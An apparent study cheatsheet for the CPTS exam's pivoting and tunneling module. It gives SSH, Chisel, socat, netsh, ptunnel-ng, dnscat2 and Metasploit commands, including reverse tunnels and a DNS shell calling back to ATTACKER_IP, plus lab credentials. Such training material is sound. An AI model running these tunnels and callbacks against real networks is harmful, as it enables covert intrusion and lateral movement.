# Pivoting, Tunneling & Port Forwarding — Exam Cheatsheet

> Fast reference for CPTS exam. Full guides in numbered .md files.

---

## Decision Tree — Which Technique to Use

```
Can you SSH to the pivot?
├── YES → ssh -D 9050 (SOCKS) or ssh -L (port forward)
└── NO → Is HTTP reachable?
    ├── YES → Chisel (forward or reverse)
    └── NO → Is ICMP allowed?
        ├── YES → ptunnel-ng
        └── NO → Is DNS allowed?
            └── YES → dnscat2

Windows pivot only?
├── Has RDP → SocksOverRDP + Proxifier
├── Has admin shell → netsh portproxy (no extra tools)
└── Has HTTP → Chisel (Windows binary)

Pivot can't accept inbound?
└── Use REVERSE tunnel (chisel --reverse, ssh -R, rpivot)
```

---

## SSH Tunneling

```bash
# Dynamic SOCKS proxy (proxychains → internal network)
ssh -D 9050 user@PIVOT_IP
# proxychains.conf: socks4 127.0.0.1 9050

# Local port forward (single port)
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_IP
# e.g.: ssh -L 8080:172.16.5.19:80 user@10.129.x.x

# Remote port forward (pivot calls back to you)
ssh -R ATTACKER_PORT:TARGET_IP:TARGET_PORT user@ATTACKER_IP
# Exposes TARGET_IP:TARGET_PORT on attack host's ATTACKER_PORT

# SSH over SSH (double hop)
ssh -J user@HOP1 user@HOP2

# Background / no shell
ssh -N -f [options] user@PIVOT_IP
```

---

## Chisel (HTTP+SSH SOCKS5 Tunnel)

```bash
# Forward mode — server on pivot
./chisel server -v -p 1234 --socks5          # on pivot
./chisel client -v PIVOT_IP:1234 socks        # on attack host → SOCKS5 on :1080

# Reverse mode — server on attack host (when pivot can't accept inbound)
sudo ./chisel server --reverse -v -p 1234 --socks5   # on attack host
./chisel client -v ATTACKER_IP:1234 R:socks           # on pivot → SOCKS5 on :1080

# proxychains.conf: socks5 127.0.0.1 1080

# Download prebuilt (avoids glibc mismatch)
curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz \
  -o /tmp/chisel.gz && gunzip /tmp/chisel.gz && chmod +x /tmp/chisel
```

---

## Proxychains

```bash
# /etc/proxychains4.conf (Kali) — last line:
socks4  127.0.0.1 9050    # for SSH -D
socks5  127.0.0.1 1080    # for Chisel

# Inline config (avoids modifying /etc/proxychains4.conf)
proxychains4 -q -f <(echo -e "[ProxyList]\nsocks5 127.0.0.1 1080") COMMAND

# Usage
proxychains nmap -sT -Pn -p 22,445,3389 172.16.5.19
proxychains evil-winrm -i 172.16.5.19 -u user -p pass
proxychains xfreerdp /v:172.16.5.19 /u:user /p:pass /cert:ignore
proxychains smbclient //172.16.5.19/C$ -U 'user%pass'
```

---

## Socat (TCP Relay / Port Forward)

```bash
# Listen on PORT, forward to TARGET_IP:TARGET_PORT
socat TCP-LISTEN:8080,fork TCP:TARGET_IP:TARGET_PORT

# Reverse shell relay (pivot listens, forwards to attack host)
socat TCP-LISTEN:8080,fork TCP:ATTACKER_IP:80 &         # on pivot
socat TCP4-LISTEN:80,fork TCP4-LISTEN:4443,reuseaddr &  # on attack host

# With SSL (encrypted relay)
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork TCP:127.0.0.1:8080
```

---

## SSH.exe & Plink (Windows Pivots)

```bash
# SSH.exe (Windows OpenSSH) — dynamic SOCKS from Windows pivot
ssh -D 9050 -N -f user@ATTACKER_IP            # pivot calls out to attacker

# Plink.exe — remote port forward from Windows (when SSH not available)
plink -R 9050 -N user@ATTACKER_IP             # pivot → attacker SOCKS
# First-run fix (accept host key): cmd /c echo y | plink.exe -R ...
```

---

## Netsh Portproxy (Windows — No Tools Needed)

```cmd
:: Add rule
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=INTERNAL_IP

:: Add firewall exception
netsh advfirewall firewall add rule name="pivot8080" protocol=TCP dir=in localport=8080 action=allow

:: Verify
netsh.exe interface portproxy show v4tov4

:: Remove
netsh.exe interface portproxy delete v4tov4 listenport=8080
netsh advfirewall firewall delete rule name="pivot8080"
```

**Double-hop netsh chain (reach host two hops away):**
```cmd
:: On Win10 pivot → forwards :8080 to DC RDP, :8081 to DC:8081
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.19
netsh.exe interface portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 connectport=8081 connectaddress=172.16.5.19

:: On DC → forwards :8081 to deep target RDP
netsh.exe interface portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.155

:: Attack host connects to PIVOT:8081 → reaches 172.16.6.155:3389
xfreerdp /v:PIVOT_IP:8081 /u:jason /p:'pass' /cert:ignore
```

---

## rpivot (Reverse SOCKS — Python 2.7)

```bash
# Attack host — start server (SOCKS4 on 127.0.0.1:9050)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Pivot host — connect client back to attack host
python2.7 client.py --server-ip ATTACKER_IP --server-port 9999

# proxychains.conf: socks4 127.0.0.1 9050
# Transfer: scp -r ~/rpivot user@PIVOT_IP:~/
```

---

## ICMP Tunneling — ptunnel-ng

```bash
# Build static binary (avoids glibc mismatch)
git clone https://github.com/utoni/ptunnel-ng.git && cd ptunnel-ng
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j$(nproc) all/' autogen.sh
./autogen.sh

# Pivot — start server
sudo ./ptunnel-ng -rPIVOT_IP -R22

# Attack host — start client (listens on TCP :2222)
sudo ./ptunnel-ng -pPIVOT_IP -l2222 -rPIVOT_IP -R22

# SSH through ICMP tunnel + SOCKS
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

---

## DNS Tunneling — dnscat2

```bash
# Attack host — start server
sudo ruby dnscat2.rb --dns host=ATTACKER_IP,port=53,domain=inlanefreight.local --no-cache
# Note the pre-shared secret from output

# Windows target — run client (PowerShell)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver ATTACKER_IP -Domain inlanefreight.local -PreSharedSecret SECRET -Exec cmd

# Interact with session
dnscat2> window -i 1

# Port forward inside DNS tunnel
exec (TARGET) 1> listen 0.0.0.0:8080 172.16.5.19:3389
```

---

## SocksOverRDP (Windows-only)

```cmd
:: On Win10 pivot — register plugin
regsvr32.exe SocksOverRDP-Plugin.dll

:: Open RDP to second hop — plugin fires → SOCKS5 on 127.0.0.1:1080
mstsc.exe /v:172.16.5.19   (login as victor)

:: On second hop (DC) — run server as Admin
SocksOverRDP-Server.exe

:: On Win10 pivot — configure Proxifier: socks5 127.0.0.1:1080
:: Then mstsc.exe → 172.16.6.155 routes through Proxifier
```

---

## Metasploit Pivoting

```
# After getting Meterpreter session on pivot:
route add 172.16.5.0/16 SESSION_ID

use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Or use portfwd for specific ports:
sessions SESSION_ID
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_IP
background
```

---

## SMB Flag Retrieval (Fast Path)

```bash
# Get flag without full RDP session
proxychains smbclient //TARGET_IP/C$ -U 'user%pass' \
  -c 'get Users\user\Desktop\flag.txt.txt /tmp/flag.txt' && cat /tmp/flag.txt

# Note: flags in this module are often named flag.txt.txt (double extension)
# Always ls the directory first:
proxychains smbclient //TARGET_IP/C$ -U 'user%pass' \
  -c 'ls Users\user\Desktop\'
```

---

## Lab Credentials (Module Practice Labs)

| Host | User | Password |
|------|------|----------|
| Linux pivot (WEB01) | ubuntu | `HTB_@cademy_stdnt!` |
| Windows DC (172.16.5.19) | victor | `pass@123` |
| Windows pivot (WIN10PIV) | htb-student | `HTB_@cademy_stdnt!` |
| Skills Assessment pivot | webadmin | SSH key at /home/webadmin/id_rsa |
| Skills Assessment hop 1 | mlefay | `Plain Human work!` |
| Skills Assessment hop 2 | vfrank | `Imply wet Unmasked!` |
| Skills Assessment deep | jason | `WellConnected123!` |

---

## Common Gotchas

| Issue | Fix |
|-------|-----|
| `proxychains` fails with socks4 on Chisel | Change to `socks5 127.0.0.1 1080` in proxychains4.conf |
| Kali proxychains path | `/etc/proxychains4.conf` (not proxychains.conf) |
| Flag not found at `flag.txt` | Try `flag.txt.txt` — double extension common in this module |
| ptunnel-ng crashes on pivot | glibc mismatch — rebuild with `LDFLAGS=-static` |
| netsh portproxy silently fails | Must run CMD as Administrator |
| SSH -D SOCKS not routing internal traffic | Check routing table on pivot (`ip route`) — ens192 must route 172.16.x.x |
| Chisel connection refused | Wrong mode — if pivot can't accept inbound, use `--reverse` on attack host |
| dnscat2 Ruby gems fail | Incompatible with Ruby 3.x — use `apt install dnscat2` or SMB shortcut |
